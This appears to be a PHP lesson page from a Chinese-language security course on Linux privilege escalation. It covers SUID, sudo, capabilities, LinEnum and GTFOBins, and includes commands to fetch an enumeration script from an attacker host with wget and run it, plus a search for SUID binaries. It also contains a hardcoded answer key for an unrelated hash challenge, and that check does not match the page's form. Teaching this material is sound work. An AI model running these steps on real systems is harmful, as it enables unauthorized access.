<?php

session_start();
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}


require_once("config.php");


if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["q1-plaintext"]) && isset($_POST["q2-plaintext"]) ){
    $input_q1_plaintext = $_POST["q1-plaintext"];
    $input_q1_algorithm = strtolower($_POST["q1-algorithm"]);
    $input_q2_plaintext = $_POST["q2-plaintext"];
    $input_q2_algorithm = strtolower($_POST["q2-algorithm"]);

    if ($input_q1_plaintext=="secret" && $input_q1_algorithm=="md5" && $input_q2_plaintext=="admin" && $input_q2_algorithm=="sha256") {
        $user_id = $_SESSION["id"];
        $challenges_name = "Cryptography-1-hash";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link,$user_id,$challenges_name);
    }else{
        $challenge_array = array('alert',' 答案錯誤');
    
    }
}else if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["string"])){
    $text = $_GET["string"];
    $textMD5 = md5($text);
    $textSHA256 = hash('sha256', $text);

}
$challenge_type =  $challenge_array[0];
$challenge_messange =  $challenge_array[1];

?>



<?php
  $titlename='Cryptography';
  include_once('../../php-inc/header.php');
?>


<h1>提升權限</h1>


<h2>What 何謂提升權限</h2>
<p>從低權限的使用者，提升權限到高權限。<br>
    利用作業系統或是程式的漏洞、設計缺陷、錯誤設定嘗試未經授權的存取</p>

<br>

<h2>Why 為什麼要提權</h2>
<ul>
    <li>重新設定密碼</li>
    <li>繞過被保護的資料</li>
    <li>修改軟體設定</li>
    <li>穩定持久連線</li>
    <li>更新/新增權限</li>
    <li>執行任何指令</li>
</ul>


<ul>
    <li>1.suid</li>
    <li>2.sudo<br>
    https://gtfobins.github.io/gtfobins/apt-get/#sudo</li>
    <li>3.capabilities</li>
    <li>4.path-injection</li>

</ul>


<h3>LinEnum</h3>
Linux 枚舉工具<br>
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh<br>

python3 -m http.server 8000<br>
wget <IP>:8000/LinEnum.sh<br>
chmod +x LinEnum.sh<br>
./LinEnum.sh<br>

<h3>SUID</h3>
r = read<br>
w = write<br>
x = execute<br>
<pre>
    user     group     others

    rwx       rwx       rwx

    421       421       421
</pre>


SUID:rws-rwx-rwx<br>
GUID:rwx-rws-rwx<br>
<br>
Finding SUID Binaries: find / -perm -u=s -type f 2>/dev/null<br>

https://gtfobins.github.io/<br>

<h2>小試身手</h2>
<form method="POST" name="form" action="">
    <div class="input-group mb-3">
        <input id="answer" name="answer" type="text" class="form-control" placeholder="回答問題，請一次輸入一個答案" aria-label="回答問題"
            aria-describedby="basic-addon2">
        <div class="input-group-append">
            <button class="btn btn-primary  " type="submit">送出答案</button>
        </div>
    </div>
</form>


<?php
include_once('../../php-inc/footer.php');
?>